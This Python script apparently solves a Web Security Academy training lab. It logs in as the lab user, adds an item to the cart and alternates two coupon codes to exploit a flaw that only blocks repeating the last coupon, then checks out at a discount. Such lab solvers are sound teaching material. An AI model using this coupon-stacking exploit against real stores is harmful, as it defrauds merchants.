from web_security_academy.core.logger import logger


def apply_coupon(session, coupon):
    csrf = session.get_csrf_token("/cart")
    data = {"csrf": csrf, "coupon": coupon}
    resp = session.post_path("/cart/coupon", data=data, allow_redirects=False)

    if resp.text != "Coupon applied":
        logger.failure(f'Unable to apply coupon "{coupon}".')
        return
    else:
        logger.info(f'Applied coupon "{coupon}"')
        session.get_path(resp.headers["Location"])


def solve_lab(session):
    session.login("wiener", "peter")
    data = {"productId": "1", "quantity": "1", "redir": "PRODUCT"}
    resp = session.post_path("/cart", data=data)
    logger.info('Add a "Lightweight l33t leather jacket" to cart.')

    # When applying a coupon, the business logic only checks whether
    # the last coupon applied is the same as the current coupon.
    # Therefore, if I have two coupons, I can apply them one after
    # the other infinitely.

    for i in range(4):
        apply_coupon(session, "NEWCUST5")
        apply_coupon(session, "SIGNUP30")

    csrf = session.get_csrf_token("/cart", n=2)
    logger.info("Proceeding to checkout...")
    resp = session.post_path(
        "/cart/checkout", data={"csrf": csrf}, allow_redirects=False
    )

    if resp.headers["Location"] != "/cart/order-confirmation?order-confirmed=true":
        logger.failure("Unable to checkout.")
    else:
        logger.success("Success!")
        session.get_path(resp.headers["Location"])
